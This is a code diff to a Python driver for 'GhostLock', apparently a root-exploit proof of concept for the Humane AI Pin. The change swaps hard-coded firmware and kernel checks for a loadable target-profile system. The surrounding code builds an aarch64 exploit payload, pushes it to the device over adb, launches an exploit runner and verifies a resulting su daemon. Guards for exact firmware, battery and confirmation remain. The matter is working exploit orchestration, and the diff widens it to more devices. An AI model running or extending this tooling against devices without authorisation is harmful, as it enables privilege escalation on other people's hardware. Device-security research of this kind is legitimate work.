@@ -16,24 +16,26 @@ from pathlib import Path
 
 
 ROOT = Path(__file__).resolve().parents[1]
+if str(ROOT) not in sys.path:
+    sys.path.insert(0, str(ROOT))
+
+from ghostlock_profile import (  # noqa: E402
+    ProfileError,
+    TargetProfile,
+    load_profiles,
+    matching_profile,
+    nearest_profile,
+    profile_by_id,
+)
+
+
 SOURCE = ROOT / "source"
-PROJECT = "humane-aipin-45.20"
+PROFILES_ROOT = ROOT / "profiles"
 PINNED_NDK_VERSION = "28.2.13676358"
-PAYLOAD = SOURCE / "build" / PROJECT / "bin" / "preload.so"
 RUNNER = ROOT / "runner/ghostlock_prod_runner.py"
 REDACTOR = ROOT / "tools/redact_report.py"
-SYMBOLS = ROOT / "profiles/humane-45.20/symbols.txt"
 REMOTE_PAYLOAD = "/data/local/tmp/ghostlock-aipin.so"
 REMOTE_SU = "/data/local/tmp/su"
-
-SUPPORTED_FINGERPRINT = (
-    "qti/atoll/atoll:12/SKQ1.230401.001/101.000470.45.20:user/release-keys"
-)
-SUPPORTED_KERNEL_MARKER = (
-    "4.14.190-perf #1 SMP PREEMPT Mon Nov 4 18:37:23 PST 2024"
-)
-SUPPORTED_SLOT = "_b"
-SUPPORTED_ABI = "arm64-v8a"
 
 
 class GhostLockError(RuntimeError):
@@ -45,6 +47,7 @@ class DeviceInfo:
     serial: str
     fingerprint: str
     kernel: str
+    kernel_release: str
     slot: str
     abi: str
     uid: str
@@ -52,33 +55,6 @@ class DeviceInfo:
     selinux: str
     battery_level: int | None
     powered: bool | None
-
-    @property
-    def compatibility_mismatches(self) -> tuple[str, ...]:
-        mismatches: list[str] = []
-        if self.fingerprint != SUPPORTED_FINGERPRINT:
-            mismatches.append(
-                "firmware fingerprint: "
-                f"expected {SUPPORTED_FINGERPRINT!r}, observed {self.fingerprint!r}"
-            )
-        if SUPPORTED_KERNEL_MARKER not in self.kernel:
-            mismatches.append(
-                "kernel build: "
-                f"required marker {SUPPORTED_KERNEL_MARKER!r}, observed {self.kernel!r}"
-            )
-        if self.slot != SUPPORTED_SLOT:
-            mismatches.append(
-                f"active slot: expected {SUPPORTED_SLOT!r}, observed {self.slot!r}"
-            )
-        if self.abi != SUPPORTED_ABI:
-            mismatches.append(
-                f"ABI: expected {SUPPORTED_ABI!r}, observed {self.abi!r}"
-            )
-        return tuple(mismatches)
-
-    @property
-    def supported(self) -> bool:
-        return not self.compatibility_mismatches
 
     @property
     def clean_shell(self) -> bool:
@@ -182,6 +158,7 @@ def inspect_device(serial: str) -> DeviceInfo:
         serial=serial,
         fingerprint=shell_value(serial, "getprop ro.build.fingerprint"),
         kernel=shell_value(serial, "uname -a"),
+        kernel_release=shell_value(serial, "uname -r"),
         slot=shell_value(serial, "getprop ro.boot.slot_suffix"),
         abi=shell_value(serial, "getprop ro.product.cpu.abi"),
         uid=shell_value(serial, "id -u"),
@@ -192,19 +169,48 @@ def inspect_device(serial: str) -> DeviceInfo:
     )
 
 
-def print_device(info: DeviceInfo) -> None:
+def evaluate_device(
+    info: DeviceInfo, profiles: tuple[TargetProfile, ...]
+) -> tuple[TargetProfile | None, tuple[str, ...]]:
+    profile = matching_profile(
+        profiles,
+        fingerprint=info.fingerprint,
+        kernel=info.kernel,
+        kernel_release=info.kernel_release,
+        slot=info.slot,
+        abi=info.abi,
+    )
+    if profile is not None:
+        return profile, ()
+    _candidate, mismatches = nearest_profile(
+        profiles,
+        fingerprint=info.fingerprint,
+        kernel=info.kernel,
+        kernel_release=info.kernel_release,
+        slot=info.slot,
+        abi=info.abi,
+    )
+    return None, mismatches
+
+
+def print_device(
+    info: DeviceInfo,
+    profile: TargetProfile | None,
+    mismatches: tuple[str, ...],
+) -> None:
     battery = "unknown" if info.battery_level is None else f"{info.battery_level}%"
     power = "unknown" if info.powered is None else ("connected" if info.powered else "not connected")
     print(f"Device:      {info.serial}")
     print(f"Firmware:    {info.fingerprint}")
     print(f"Kernel:      {info.kernel}")
+    print(f"Release:     {info.kernel_release}")
     print(f"Slot:        {info.slot}")
     print(f"ABI:         {info.abi}")
     print(f"Shell:       uid={info.uid} {info.context}")
     print(f"SELinux:     {info.selinux}")
     print(f"Battery:     {battery}, external power {power}")
-    print(f"Profile:     {'supported' if info.supported else 'UNSUPPORTED'}")
-    for mismatch in info.compatibility_mismatches:
+    print(f"Profile:     {profile.profile_id if profile else 'UNSUPPORTED'}")
+    for mismatch in mismatches:
         print(f"Mismatch:    {mismatch}")
 
 
@@ -248,7 +254,11 @@ def sha256(path: Path) -> str:
     return digest.hexdigest()
 
 
-def build_payload(ndk_arg: str | None) -> str:
+def payload_path(profile: TargetProfile) -> Path:
+    return SOURCE / "build" / profile.project / "bin" / "preload.so"
+
+
+def build_payload(profile: TargetProfile, ndk_arg: str | None) -> tuple[Path, str]:
     require_command("make")
     ndk = find_ndk(ndk_arg)
     if ndk is None:
@@ -266,26 +276,33 @@ def build_payload(ndk_arg: str | None) -> str:
             str(SOURCE),
             "clean",
             "preload",
-            f"PROJECT={PROJECT}",
+            f"PROJECT={profile.project}",
+            f"PROFILE_MANIFEST={profile.manifest_path}",
         ],
         timeout=300,
         env=environment,
     )
     print(result.stdout, end="")
-    if not PAYLOAD.is_file():
-        raise GhostLockError(f"build succeeded without producing {PAYLOAD}")
-    digest = sha256(PAYLOAD)
-    print(f"Payload:     {PAYLOAD}")
+    payload = payload_path(profile)
+    if not payload.is_file():
+        raise GhostLockError(f"build succeeded without producing {payload}")
+    digest = sha256(payload)
+    print(f"Payload:     {payload}")
     print(f"SHA-256:     {digest}")
-    return digest
+    return payload, digest
 
 
-def require_target(info: DeviceInfo, *, min_battery: int) -> None:
-    if not info.supported:
-        details = "; ".join(info.compatibility_mismatches)
+def require_target(
+    info: DeviceInfo,
+    profiles: tuple[TargetProfile, ...],
+    *,
+    min_battery: int,
+) -> TargetProfile:
+    profile, mismatches = evaluate_device(info, profiles)
+    if profile is None:
+        details = "; ".join(mismatches)
         raise GhostLockError(
-            "unsupported device or firmware; this PoC accepts only Humane retail "
-            "45.20 on slot _b with the exact profiled kernel. "
+            "unsupported device or firmware; no evidence-backed profile matches. "
             f"Mismatch: {details}"
         )
     if not info.clean_shell:
@@ -305,6 +322,7 @@ def require_target(info: DeviceInfo, *, min_battery: int) -> None:
             )
         if not info.powered:
             raise GhostLockError("external power is not connected")
+    return profile
 
 
 def confirm_risk(info: DeviceInfo, assume_yes: bool) -> None:
@@ -323,9 +341,9 @@ def confirm_risk(info: DeviceInfo, assume_yes: bool) -> None:
         raise GhostLockError("confirmation did not match the connected device")
 
 
-def push_payload(serial: str, digest: str) -> None:
+def push_payload(serial: str, payload: Path, digest: str) -> None:
     print(f"Pushing payload to {serial} …")
-    result = adb(serial, "push", str(PAYLOAD), REMOTE_PAYLOAD, timeout=120)
+    result = adb(serial, "push", str(payload), REMOTE_PAYLOAD, timeout=120)
     print(result.stdout, end="")
     shell(serial, f"chmod 0644 {REMOTE_PAYLOAD}")
     remote_fields = shell_value(
@@ -361,24 +379,39 @@ def verify_root(serial: str) -> bool:
 
 
 def command_check(args: argparse.Namespace) -> int:
+    profiles = load_profiles(PROFILES_ROOT)
     serial = select_serial(args.serial)
     info = inspect_device(serial)
-    print_device(info)
+    profile, mismatches = evaluate_device(info, profiles)
+    print_device(info, profile, mismatches)
     ndk = find_ndk(args.ndk)
     print(
         f"Android NDK: {ndk if ndk else f'{PINNED_NDK_VERSION} not found'}"
     )
-    if not info.supported:
+    if profile is None:
         return 2
     if not info.clean_shell:
         print("Status:      supported, but this boot is not clean for a new exploit run")
+        return 1
+    if ndk is None:
+        print("Status:      device supported, but the pinned Android NDK is missing")
         return 1
     print("Status:      ready for a guarded run")
     return 0
 
 
 def command_build(args: argparse.Namespace) -> int:
-    build_payload(args.ndk)
+    profiles = load_profiles(PROFILES_ROOT)
+    if args.profile:
+        profile = profile_by_id(profiles, args.profile)
+    elif len(profiles) == 1:
+        profile = profiles[0]
+    else:
+        available = ", ".join(item.profile_id for item in profiles)
+        raise GhostLockError(
+            f"multiple profiles are available; pass --profile from: {available}"
+        )
+    build_payload(profile, args.ndk)
     return 0
 
 
@@ -396,18 +429,21 @@ def command_report(args: argparse.Namespace) -> int:
 
 
 def command_run(args: argparse.Namespace) -> int:
+    profiles = load_profiles(PROFILES_ROOT)
     serial = select_serial(args.serial)
     info = inspect_device(serial)
-    print_device(info)
-    require_target(info, min_battery=args.min_battery)
+    selected, mismatches = evaluate_device(info, profiles)
+    print_device(info, selected, mismatches)
+    profile = require_target(info, profiles, min_battery=args.min_battery)
     confirm_risk(info, args.yes)
 
-    digest = sha256(PAYLOAD) if args.no_build and PAYLOAD.is_file() else None
+    payload = payload_path(profile)
+    digest = sha256(payload) if args.no_build and payload.is_file() else None
     if args.no_build and digest is None:
-        raise GhostLockError(f"--no-build requested but {PAYLOAD} does not exist")
+        raise GhostLockError(f"--no-build requested but {payload} does not exist")
     if digest is None:
-        digest = build_payload(args.ndk)
-    push_payload(serial, digest)
+        payload, digest = build_payload(profile, args.ndk)
+    push_payload(serial, payload, digest)
 
     output = evidence_path(args.output_dir)
     command = [
@@ -415,14 +451,10 @@ def command_run(args: argparse.Namespace) -> int:
         str(RUNNER),
         "--serial",
         serial,
-        "--expected-fingerprint",
-        SUPPORTED_FINGERPRINT,
-        "--expected-slot",
-        SUPPORTED_SLOT,
-        "--expected-kernel-substring",
-        SUPPORTED_KERNEL_MARKER,
-        "--symbols",
-        str(SYMBOLS),
+        "--profile-id",
+        profile.profile_id,
+        "--profile-sha256",
+        profile.manifest_sha256,
         "--payload-sha256",
         digest,
         "--remote-payload",
@@ -472,6 +504,7 @@ def parser() -> argparse.ArgumentParser:
 
     build = sub.add_parser("build", help="build the aarch64 exploit payload from source")
     build.add_argument("--ndk")
+    build.add_argument("--profile", help="evidence-backed profile ID")
     build.set_defaults(handler=command_build)
 
     verify = sub.add_parser("verify", help="verify a live boot-scoped su daemon")
@@ -514,7 +547,7 @@ def main(argv: list[str] | None = None) -> int:
     args = parser().parse_args(argv)
     try:
         return int(args.handler(args))
-    except GhostLockError as exc:
+    except (GhostLockError, ProfileError) as exc:
         print(f"ERROR: {exc}", file=sys.stderr)
         return 2
     except KeyboardInterrupt:
